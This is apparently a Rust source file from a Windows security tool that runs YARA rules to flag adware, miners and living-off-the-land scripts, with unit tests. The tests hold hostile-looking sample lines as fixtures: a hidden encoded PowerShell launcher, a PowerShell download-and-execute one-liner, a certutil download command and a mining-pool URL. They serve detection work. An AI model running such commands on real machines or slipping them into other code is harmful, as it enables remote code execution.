//! Pattern matching against the grey band Defender leaves alone.
//!
//! This crate compiles and runs YARA rules. It exists as its own crate for one
//! reason, and it is a security reason rather than a tidiness one.
//!
//! # Why this is not part of the scanner crate
//!
//! `yara-x` compiles rules to WebAssembly and executes them through wasmtime,
//! which carries a JIT compiler. That is a large and complicated thing to have
//! running, and at the time of writing the wasmtime release it depends on has a
//! published advisory with no fixed version in its line (see `deny.toml`).
//!
//! Everything else in this product that examines the machine runs inside the
//! agent, as LocalSystem. This does not. Only the unprivileged shell links this
//! crate, so the JIT runs in the process that already has exactly the user's
//! own rights and nothing more — where a compromise gains an attacker nothing
//! they did not already have.
//!
//! That works because of an asymmetry worth stating plainly: privilege is
//! needed to *find* the interesting executables — enumerating services, the
//! task store, both registry hives — but not to *read* them. `System32`,
//! `Program Files`, `ProgramData` and the driver store are all readable by an
//! ordinary user. So the agent finds; the shell reads and matches.
//!
//! # What the rules are for
//!
//! Not malware. Defender does that, better, with intelligence no side project
//! will match. These rules cover what Defender deliberately tolerates: bundled
//! adware, scareware optimisers, browser hijackers, miners, and the
//! living-off-the-land patterns that are only visible as text.

use std::path::{Path, PathBuf};
use std::time::Duration;

use serde::{Deserialize, Serialize};

/// The rules shipped with the product.
const BUNDLED: &str = include_str!("../rules/bundled.yar");

/// Files larger than this are not matched.
///
/// Rules here look for short strings near the start of a file or in its section
/// table; none of them need half a gigabyte of game assets read into memory.
/// The cap is reported rather than applied silently.
const MAX_FILE_BYTES: u64 = 64 * 1024 * 1024;

/// Ceiling on a single file's matching, so one pathological input cannot stall
/// the whole run.
const SCAN_TIMEOUT: Duration = Duration::from_secs(10);

/// Extensions Windows will execute as a script.
///
/// Rules that match on text rather than structure need to know whether the
/// bytes in front of them belong to something that runs. A `.ps1` containing an
/// encoded PowerShell command is a finding; a text file containing the same
/// sentence is a text file.
const SCRIPT_EXTENSIONS: &[&str] = &[
    "ps1", "psm1", "bat", "cmd", "vbs", "vbe", "js", "jse", "wsf", "wsh", "hta",
];

/// How much a match is worth claiming.
///
/// These are the rule author's words, carried through from the rule's own
/// metadata rather than inferred here.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Confidence {
    /// A true statement about the file that implies no wrongdoing.
    Informational,
    /// Characteristic of unwanted software. Legitimate programs do trigger it.
    Notable,
    /// Highly specific to a behaviour with few innocent uses.
    Strong,
}

impl Confidence {
    fn parse(text: &str) -> Self {
        match text {
            "strong" => Self::Strong,
            "notable" => Self::Notable,
            _ => Self::Informational,
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            Self::Informational => "worth knowing",
            Self::Notable => "characteristic of unwanted software",
            Self::Strong => "specific and unusual",
        }
    }
}

/// One rule matching one file.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleMatch {
    /// The rule's identifier, so a person can find it in the rule file.
    pub rule: String,
    pub category: String,
    pub confidence: Confidence,
    /// The rule author's explanation, written for the reader.
    pub explains: String,
    /// Whether this came from the bundled rules or the user's own.
    pub bundled: bool,
    /// Which of the rule's patterns actually matched.
    ///
    /// Kept because a rule name alone is an assertion. These are what the rule
    /// saw, and they are how a false positive gets diagnosed instead of argued
    /// about.
    pub evidence: Vec<String>,
}

/// Everything one run produced.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct RuleReport {
    /// Matches by file path. Files with nothing to say do not appear.
    pub matches: Vec<FileMatches>,
    pub files_scanned: usize,
    /// Files passed over because they were too large, with the reason.
    pub skipped: Vec<String>,
    pub rules_loaded: usize,
    /// Where user rules were looked for, so an empty result is explicable.
    pub user_rules_directory: String,
    pub user_rules_loaded: usize,
    /// Anything that went wrong that the reader should know about, rather than
    /// a silently shorter list.
    pub problems: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileMatches {
    pub path: String,
    pub matches: Vec<RuleMatch>,
}

impl FileMatches {
    /// The strongest claim made about this file.
    pub fn highest(&self) -> Confidence {
        self.matches
            .iter()
            .map(|hit| hit.confidence)
            .max()
            .unwrap_or(Confidence::Informational)
    }
}

/// Where a user may drop their own rules.
///
/// Community YARA rules are a real ecosystem and there is no reason to lock
/// someone out of it. These are the user's own files, loaded at their request.
pub fn user_rules_directory() -> PathBuf {
    let base = std::env::var("ProgramData").unwrap_or_else(|_| r"C:\ProgramData".to_owned());
    PathBuf::from(base).join("KAM Security").join("rules")
}

/// Compiled rules, ready to match against files.
///
/// `yara_x::Rules` is not `Debug`, so this is written out by hand rather than
/// derived; the compiled rule set is not something worth printing anyway.
pub struct Engine {
    rules: yara_x::Rules,
    bundled_rules: Vec<String>,
    loaded: usize,
    user_loaded: usize,
    problems: Vec<String>,
}

impl std::fmt::Debug for Engine {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter
            .debug_struct("Engine")
            .field("loaded", &self.loaded)
            .field("user_loaded", &self.user_loaded)
            .field("problems", &self.problems)
            .finish_non_exhaustive()
    }
}

impl Engine {
    /// Compile the bundled rules, plus any the user has supplied.
    ///
    /// A broken user rule file is reported and skipped rather than being
    /// allowed to take the bundled rules down with it: someone experimenting
    /// with their own rule should not lose the working ones.
    pub fn load() -> kam_core::Result<Self> {
        let mut compiler = yara_x::Compiler::new();
        let mut problems = Vec::new();

        // Declared before any source is added, since the rules reference them.
        compiler
            .define_global("kam_script", false)
            .and_then(|compiler| compiler.define_global("kam_ext", ""))
            .map_err(|error| {
                kam_core::Error::Refused(format!("rule globals could not be declared: {error}"))
            })?;

        compiler.add_source(BUNDLED).map_err(|error| {
            kam_core::Error::Refused(format!("bundled rules did not compile: {error}"))
        })?;

        // Remember which identifiers are ours, so the interface can tell the
        // reader whether a match came from this product or from a rule they
        // added themselves.
        let bundled_rules: Vec<String> = rule_names(BUNDLED);

        let directory = user_rules_directory();
        let mut user_loaded = 0;
        if let Ok(listing) = std::fs::read_dir(&directory) {
            for item in listing.flatten() {
                let path = item.path();
                let is_rule = path.extension().is_some_and(|extension| {
                    extension.eq_ignore_ascii_case("yar") || extension.eq_ignore_ascii_case("yara")
                });
                if !is_rule {
                    continue;
                }
                match std::fs::read_to_string(&path) {
                    Ok(source) => match compiler.add_source(source.as_str()) {
                        Ok(_) => user_loaded += 1,
                        Err(error) => problems.push(format!(
                            "{} did not compile and was skipped: {error}",
                            path.display()
                        )),
                    },
                    Err(error) => {
                        problems.push(format!("{} could not be read: {error}", path.display()))
                    }
                }
            }
        }

        let rules = compiler.build();
        let loaded = rules.iter().count();

        Ok(Self {
            rules,
            bundled_rules,
            loaded,
            user_loaded,
            problems,
        })
    }

    /// Match one file with an already-built scanner.
    ///
    /// The scanner is passed in rather than created here: constructing one
    /// instantiates the compiled rules, and doing that per file was costing
    /// roughly 180ms each -- two and a half minutes over a machine's worth of
    /// executables, against a few seconds when it is built once and reused.
    fn scan_file(
        &self,
        scanner: &mut yara_x::Scanner<'_>,
        path: &Path,
        report: &mut RuleReport,
    ) -> Option<FileMatches> {
        let metadata = std::fs::metadata(path).ok()?;
        if metadata.len() > MAX_FILE_BYTES {
            report.skipped.push(format!(
                "{} was not examined: {} MB is larger than the {} MB limit",
                path.display(),
                metadata.len() / (1024 * 1024),
                MAX_FILE_BYTES / (1024 * 1024)
            ));
            return None;
        }

        let data = std::fs::read(path).ok()?;

        let extension = path
            .extension()
            .map(|extension| extension.to_string_lossy().to_lowercase())
            .unwrap_or_default();

        let _ = scanner.set_global(
            "kam_script",
            SCRIPT_EXTENSIONS.contains(&extension.as_str()),
        );
        let _ = scanner.set_global("kam_ext", extension.as_str());

        let results = scanner.scan(&data).ok()?;

        let matches: Vec<RuleMatch> = results
            .matching_rules()
            .map(|rule| {
                let identifier = rule.identifier().to_owned();
                let mut category = String::new();
                let mut confidence = Confidence::Informational;
                let mut explains = String::new();

                for (key, value) in rule.metadata() {
                    let yara_x::MetaValue::String(text) = value else {
                        continue;
                    };
                    match key {
                        "kam_category" => category = text.to_owned(),
                        "kam_confidence" => confidence = Confidence::parse(text),
                        "kam_explains" => explains = text.to_owned(),
                        _ => {}
                    }
                }

                // A user's own rule need not carry our metadata, and should not
                // be dropped for lacking it.
                if category.is_empty() {
                    category = identifier.replace('_', " ");
                }
                if explains.is_empty() {
                    explains =
                        "A rule you added matched this file. Its own file explains what it looks for."
                            .to_owned();
                }

                let evidence: Vec<String> = rule
                    .patterns()
                    .filter(|pattern| pattern.matches().len() > 0)
                    .map(|pattern| pattern.identifier().trim_start_matches('$').to_owned())
                    .collect();

                RuleMatch {
                    evidence,
                    bundled: self.bundled_rules.contains(&identifier),
                    rule: identifier,
                    category,
                    confidence,
                    explains,
                }
            })
            .collect();

        (!matches.is_empty()).then(|| FileMatches {
            path: path.display().to_string(),
            matches,
        })
    }

    /// Match every given file.
    ///
    /// Ordered strongest claim first, so the top of the list is the part worth
    /// reading.
    pub fn scan(&self, paths: &[String]) -> RuleReport {
        let mut report = RuleReport {
            rules_loaded: self.loaded,
            user_rules_loaded: self.user_loaded,
            user_rules_directory: user_rules_directory().display().to_string(),
            problems: self.problems.clone(),
            ..Default::default()
        };

        let mut scanner = yara_x::Scanner::new(&self.rules);
        scanner.set_timeout(SCAN_TIMEOUT);

        for path in paths {
            let path = Path::new(path);
            if !path.is_file() {
                continue;
            }
            report.files_scanned += 1;
            if let Some(hit) = self.scan_file(&mut scanner, path, &mut report) {
                report.matches.push(hit);
            }
        }

        report.matches.sort_by(|a, b| {
            b.highest()
                .cmp(&a.highest())
                .then_with(|| a.path.to_lowercase().cmp(&b.path.to_lowercase()))
        });
        report
    }
}

/// Pull rule identifiers out of source text.
///
/// Only used to tell bundled rules from the user's own. Deliberately crude:
/// getting it wrong mislabels a badge, and parsing YARA properly to do that
/// would be absurd.
fn rule_names(source: &str) -> Vec<String> {
    source
        .lines()
        .filter_map(|line| {
            let rest = line.trim().strip_prefix("rule ")?;
            let name = rest.split_whitespace().next()?.trim_end_matches('{').trim();
            (!name.is_empty()).then(|| name.to_owned())
        })
        .collect()
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    use super::*;
    use std::io::Write;

    fn engine() -> Engine {
        Engine::load().expect("the bundled rules must compile")
    }

    /// Write a file whose *text* trips a rule. Nothing here is malicious: these
    /// are the strings such software contains, not the software.
    fn sample(name: &str, body: &[u8]) -> PathBuf {
        let path = std::env::temp_dir().join(format!("kam-rule-{}-{name}", std::process::id()));
        // `name` carries its own extension: the content rules deliberately
        // refuse to fire on files Windows would not execute.
        let mut file = std::fs::File::create(&path).unwrap();
        file.write_all(body).unwrap();
        path
    }

    fn scan_one(engine: &Engine, path: &Path) -> Vec<String> {
        let report = engine.scan(&[path.display().to_string()]);
        report
            .matches
            .first()
            .map(|hit| hit.matches.iter().map(|m| m.rule.clone()).collect())
            .unwrap_or_default()
    }

    #[test]
    fn the_bundled_rules_compile() {
        // The single most important test here: a rule file that does not
        // compile takes the whole layer with it.
        let engine = engine();
        assert!(
            engine.loaded >= 8,
            "expected the bundled rules, got {}",
            engine.loaded
        );
        assert!(engine.problems.is_empty(), "{:?}", engine.problems);
    }

    #[test]
    fn every_bundled_rule_carries_its_explanation() {
        // A match with no explanation is a rule name shouted at someone. The
        // metadata is not optional, so this asserts it structurally rather
        // than trusting the author to remember.
        for name in rule_names(BUNDLED) {
            let block = BUNDLED
                .split(&format!("rule {name}"))
                .nth(1)
                .unwrap_or_default();
            let meta = block.split("strings:").next().unwrap_or_default();
            let meta = meta.split("condition:").next().unwrap_or(meta);
            for key in ["kam_category", "kam_confidence", "kam_explains"] {
                assert!(meta.contains(key), "rule {name} is missing {key}");
            }
        }
    }

    #[test]
    fn miner_strings_are_recognised() {
        let path = sample(
            "miner.cmd",
            b"config: stratum+tcp://pool.supportxmr.com:3333 --donate-level 1 randomx",
        );
        assert!(scan_one(&engine(), &path).contains(&"cryptocurrency_miner".to_owned()));
        std::fs::remove_file(&path).unwrap();
    }

    #[test]
    fn a_single_miner_word_is_not_enough() {
        // The rule requires two independent markers precisely so that a
        // blocklist, a document, or a security tool mentioning mining once
        // does not trip it.
        let path = sample(
            "mention.cmd",
            b"Our firewall blocks stratum+tcp:// connections.",
        );
        assert!(
            !scan_one(&engine(), &path).contains(&"cryptocurrency_miner".to_owned()),
            "one mention should not be enough"
        );
        std::fs::remove_file(&path).unwrap();
    }

    #[test]
    fn hidden_encoded_powershell_is_recognised() {
        let path = sample(
            "ps.ps1",
            b"powershell.exe -w hidden -EncodedCommand SQBFAFgAIAA=",
        );
        assert!(scan_one(&engine(), &path).contains(&"encoded_powershell_launcher".to_owned()));
        std::fs::remove_file(&path).unwrap();
    }

    #[test]
    fn an_ordinary_powershell_call_is_left_alone() {
        let path = sample("ps-ok.ps1", b"powershell.exe -File C:\\setup\\install.ps1");
        assert!(
            scan_one(&engine(), &path).is_empty(),
            "a plain PowerShell invocation is not a finding"
        );
        std::fs::remove_file(&path).unwrap();
    }

    #[test]
    fn download_and_run_is_recognised() {
        let path = sample(
            "dl.ps1",
            b"IEX((New-Object Net.WebClient).DownloadString('http://example.test/a'))",
        );
        assert!(scan_one(&engine(), &path).contains(&"downloads_and_executes".to_owned()));
        std::fs::remove_file(&path).unwrap();
    }

    #[test]
    fn certutil_used_as_a_downloader_is_recognised() {
        let path = sample(
            "certutil.bat",
            b"certutil -urlcache -split -f http://example.test/a.bin",
        );
        assert!(scan_one(&engine(), &path).contains(&"downloads_and_executes".to_owned()));
        std::fs::remove_file(&path).unwrap();
    }

    #[test]
    fn rules_needing_a_real_executable_do_not_fire_on_text() {
        // Several rules are fenced behind `pe.is_pe` so that data files
        // containing these words -- antivirus definitions, blocklists, this
        // very rule file -- are never mistaken for programs.
        let path = sample(
            "text.txt",
            b"InstallCore OpenCandy Amonetize AnyDesk TeamViewer SearchScopes Start Page",
        );
        let hits = scan_one(&engine(), &path);
        for fenced in [
            "bundled_installer_wrapper",
            "remote_access_tool",
            "browser_search_hijack",
        ] {
            // `remote_access_tool` now reads the PE version resource rather
            // than searching bytes, so a text file cannot reach it at all.
            assert!(
                !hits.contains(&fenced.to_owned()),
                "{fenced} fired on a text file: {hits:?}"
            );
        }
        std::fs::remove_file(&path).unwrap();
    }

    #[test]
    fn this_rule_file_does_not_match_itself() {
        // It contains every string the rules look for. If the fences are wrong
        // this is where it shows.
        let path = sample("self.yar", BUNDLED.as_bytes());
        assert!(
            scan_one(&engine(), &path).is_empty(),
            "the rule file matched itself: {:?}",
            scan_one(&engine(), &path)
        );
        std::fs::remove_file(&path).unwrap();
    }

    #[test]
    fn windows_own_binaries_are_not_flagged() {
        // The test that matters most. These are signed Microsoft binaries on
        // every machine; a rule firing on one is a false positive by
        // definition, and would discredit everything else in the list.
        let root = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_owned());
        let engine = engine();
        for name in [
            "notepad.exe",
            "explorer.exe",
            "regedit.exe",
            "System32\\cmd.exe",
            "System32\\svchost.exe",
            "System32\\taskmgr.exe",
        ] {
            let path = PathBuf::from(&root).join(name);
            if !path.is_file() {
                continue;
            }
            let hits = scan_one(&engine, &path);
            assert!(
                hits.is_empty(),
                "{} matched {hits:?} -- a false positive on a Windows binary",
                path.display()
            );
        }
    }

    #[test]
    fn real_software_on_this_machine_is_mostly_left_alone() {
        // The measurement that decides whether this layer is worth having.
        // Rules that fire on a tenth of an ordinary machine are noise, however
        // well written each one is individually. Everything installed here is
        // software the owner chose, so a match is either a true observation
        // (packed, remote-access) or a false alarm.
        let mut paths = Vec::new();
        for root in [
            std::env::var("ProgramFiles").ok(),
            std::env::var("ProgramFiles(x86)").ok(),
            std::env::var("USERPROFILE")
                .ok()
                .map(|p| format!("{p}\\Downloads")),
        ]
        .into_iter()
        .flatten()
        {
            collect(Path::new(&root), 0, &mut paths);
        }

        if paths.len() < 50 {
            println!("only {} executables found; skipping", paths.len());
            return;
        }

        let engine = engine();
        let started = std::time::Instant::now();
        let report = engine.scan(&paths);
        let elapsed = started.elapsed();

        let mut by_rule: std::collections::BTreeMap<&str, usize> =
            std::collections::BTreeMap::new();
        let mut loud = 0;
        for hit in &report.matches {
            for m in &hit.matches {
                *by_rule.entry(m.rule.as_str()).or_default() += 1;
            }
            if hit.highest() > Confidence::Informational {
                loud += 1;
            }
        }

        println!(
            "scanned {} executables in {:.1}s, {} matched",
            report.files_scanned,
            elapsed.as_secs_f64(),
            report.matches.len()
        );
        println!("by rule: {by_rule:?}");
        println!("above informational: {loud}");
        for hit in report.matches.iter().take(12) {
            println!(
                "  [{}] {} -- {} ({})",
                hit.highest().label(),
                hit.path,
                hit.matches
                    .iter()
                    .map(|m| m.rule.as_str())
                    .collect::<Vec<_>>()
                    .join(", "),
                hit.matches
                    .iter()
                    .flat_map(|m| m.evidence.iter())
                    .cloned()
                    .collect::<Vec<_>>()
                    .join("/")
            );
        }

        // Informational matches (packed, remote-access) are expected and fine.
        // Anything claiming more than that should be rare on a machine whose
        // owner chose everything on it.
        assert!(
            loud * 20 <= report.files_scanned.max(20),
            "{loud} of {} flagged above informational -- too eager",
            report.files_scanned
        );
    }

    fn collect(folder: &Path, depth: usize, found: &mut Vec<String>) {
        if depth > 3 || found.len() >= 1500 {
            return;
        }
        let Ok(listing) = std::fs::read_dir(folder) else {
            return;
        };
        for item in listing.flatten() {
            if found.len() >= 1500 {
                return;
            }
            let path = item.path();
            match item.file_type() {
                Ok(kind) if kind.is_symlink() => continue,
                Ok(kind) if kind.is_dir() => collect(&path, depth + 1, found),
                Ok(_)
                    if path
                        .extension()
                        .is_some_and(|e| e.eq_ignore_ascii_case("exe")) =>
                {
                    found.push(path.display().to_string());
                }
                _ => {}
            }
        }
    }

    #[test]
    fn the_pe_machinery_the_rules_depend_on_actually_works() {
        // A rule that silently never fires is indistinguishable from a clean
        // machine, which is the most dangerous failure this crate can have:
        // it reports good news either way. Several bundled rules are built on
        // `pe.sections` and `pe.version_info`, so this proves both work by
        // asserting a probe rule matches a binary that must satisfy it.
        let mut compiler = yara_x::Compiler::new();
        compiler
            .add_source(
                r#"
import "pe"
rule probe_sections { condition: pe.is_pe and for any s in pe.sections : ( s.name == ".text" ) }
rule probe_version { condition: pe.is_pe and for any k, v in pe.version_info : ( v icontains "Microsoft" ) }
"#,
            )
            .expect("the probe rules must compile");
        let rules = compiler.build();

        let root = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_owned());
        let data = std::fs::read(PathBuf::from(root).join("System32").join("notepad.exe"))
            .expect("notepad must be readable");

        let mut scanner = yara_x::Scanner::new(&rules);
        let results = scanner.scan(&data).expect("the scan must run");
        let fired: Vec<&str> = results.matching_rules().map(|r| r.identifier()).collect();

        assert!(
            fired.contains(&"probe_sections"),
            "pe.sections iteration is not working: {fired:?}"
        );
        assert!(
            fired.contains(&"probe_version"),
            "pe.version_info iteration is not working: {fired:?}"
        );
    }

    #[test]
    fn a_missing_file_is_skipped_rather_than_failing_the_run() {
        let report = engine().scan(&[r"C:\does\not\exist.exe".to_owned()]);
        assert_eq!(report.files_scanned, 0);
        assert!(report.matches.is_empty());
    }

    #[test]
    fn rule_names_are_extracted_but_commented_ones_are_not() {
        let names = rule_names("rule alpha\n{\n}\nrule beta {\n}\n// rule commented");
        assert_eq!(names, vec!["alpha", "beta"]);
    }
}
